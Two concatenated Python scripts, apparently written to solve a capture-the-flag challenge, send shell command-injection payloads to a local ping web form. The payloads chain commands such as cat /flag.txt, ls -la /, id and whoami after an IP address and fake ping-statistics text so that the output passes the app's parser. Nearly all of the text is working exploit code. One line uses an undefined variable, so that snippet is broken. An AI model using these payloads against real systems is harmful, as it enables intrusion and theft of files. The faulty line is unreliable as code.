import requests
import re

url = 'http://127.0.0.1:33052/ping'

# Construct payloads where command output appears in first capture group
payloads = [
    # Put command output directly before "packets transmitted"
    "127.0.0.1;cat /flag.txt;echo ' packets transmitted, 2 received, 0% packet loss'",
    
    # Try with numeral to match format  
    "127.0.0.1;cat /flag.txt;echo 'FLAG packets transmitted, 2 received, 0% packet loss'",
    
    # Use xargs or similar to inline the content
    "127.0.0.1;cat /flag.txt | xargs -I {} echo '{} packets transmitted, 2 received, 0% packet loss'",
    
    # Try to output number first, then command, then format
    "127.0.0.1;echo -n '1 ';cat /flag.txt;echo ' packets transmitted, 2 received, 0% packet loss'",
    
    # Read and format in one command using awk
    "127.0.0.1;awk '{print $0 \" packets transmitted, 2 received, 0% packet loss\"}' /flag.txt",
    
    # Try if file exists at all by outputting error
    "127.0.0.1;cat /flag.txt;echo '1 packets transmitted, 2 received, 0% packet loss'",
    
    # List files to see structure  
    "127.0.0.1;ls -la /;echo '1 packets transmitted, 2 received, 0% packet loss'",
    
    # Try common locations
    "127.0.0.1;cat /opt/flag.txt;echo '1 packets transmitted, 2 received, 0% packet loss'",
    "127.0.0.1;cat /tmp/flag.txt;echo '1 packets transmitted, 2 received, 0% packet loss'",
    "127.0.0.1;cat /var/flag.txt;echo '1 packets transmitted, 2 received, 0% packet loss'",
    
    # Use wildcard
    "127.0.0.1;cat /*/flag.txt 2>/dev/null;echo '1 packets transmitted, 2 received, 0% packet loss'",
]

for payload in payloads:
    print(f'┌─ Payload: {repr(payload)}')
    
    try:
        resp = requests.post(url, data={'ip_address': payload}, timeout=10)
        
        print(f'│ Status: {resp.status_code}')
        
        if "Invalid input" in resp.text:
            print("│ FILTER BLOCKED")
        else:
            print("│ FILTER PASSED")
            
            # Extract parsed values
            parsed_match = re.search(r'<pre>Packets Transmitted: (.*?), Packets Received: (.*?), Packet Loss: (.*?)%</pre>', resp.text)
            if parsed_match:
                trans, recv, loss = parsed_match.groups()
                print(f"│ Parsed: Transmitted='{trans}' (len={len(trans)})")
                # Look for any non-standard content
                if trans != "1" and trans != "2" and "ping:" not in trans:
                    print(f"│ [!] POTENTIAL DATA: {trans[:500]}")
            else:
                # Check for error message
                error_match = re.search(r'Failed to parse ping output.*', resp.text)
                if error_match:
                    print(f"│ PARSE ERROR: {error_match.group()}")
        
        print(f"│ Response snippet: {resp.text[response.text.find('<pre>'):response.text.find('</pre>')+6] if '<pre>' in resp.text else resp.text[:200]}")
        
    except Exception as e:
        print(f'│ ERROR: {e}')
    
    print('└─' + '-'*70)
    print()
import requests
import re

url = 'http://127.0.0.1:33052/ping'

# Test to see if we can get ANY command output in the first capture group
payloads = [
    # Test with id command output
    "127.0.0.1;id;echo ' packets transmitted, 2 received, 0% packet loss'",
    
    # Test with whoami 
    "127.0.0.1;whoami;echo ' packets transmitted, 2 received, 0% packet loss'",
    
    # Test with pwd
    "127.0.0.1;pwd;echo ' packets transmitted, 2 received, 0% packet loss'",
    
    # Test hostname
    "127.0.0.1;hostname;echo ' packets transmitted, 2 received, 0% packet loss'",
    
    # Try combining in more creative ways
    "127.0.0.1;echo $(id);echo ' packets transmitted, 2 received, 0% packet loss'",
    
    # Use printf to format
    "127.0.0.1;printf '%s packets transmitted, 2 received, 0%% packet loss' $(whoami)",
    
    # Try with echo -e for newline handling
    "127.0.0.1;echo -e 'ROOT packets transmitted, 2 received, 0% packet loss'",
    
    # Direct injection with &&
    "127.0.0.1 && echo 'ROOT packets transmitted, 2 received, 0% packet loss'",
    
    # Try || operator
    "127.0.0.1 || echo 'ROOT packets transmitted, 2 received, 0% packet loss'",
]

for payload in payloads:
    print(f'┌─ Payload: {repr(payload)}')
    
    try:
        resp = requests.post(url, data={'ip_address': payload}, timeout=10)
        
        print(f'│ Status: {resp.status_code}')
        
        if "Invalid input" in resp.text:
            print("│ FILTER BLOCKED")
        else:
            print("│ FILTER PASSED")
            
            # Extract parsed values from <pre> tag
            pre_match = re.search(r'<pre>(.*?)</pre>', resp.text, re.DOTALL)
            if pre_match:
                content = pre_match.group(1)
                print(f"│ <pre> content: {content}")
                
                # Check if content was modified
                if "Packets Transmitted:" in content:
                    # Extract the transmitted value
                    val_match = re.search(r'Packets Transmitted: (.*?),', content)
                    if val_match:
                        trans = val_match.group(1).strip()
                        print(f"│ Transmitted value: '{trans}'")
                        if trans not in ['1', '2', '0'] and 'ping:' not in trans:
                            print(f"│ [!] UNUSUAL VALUE - command output?: {trans}")
        
    except Exception as e:
        print(f'│ ERROR: {e}')
    
    print('└─' + '-'*70)
    print()
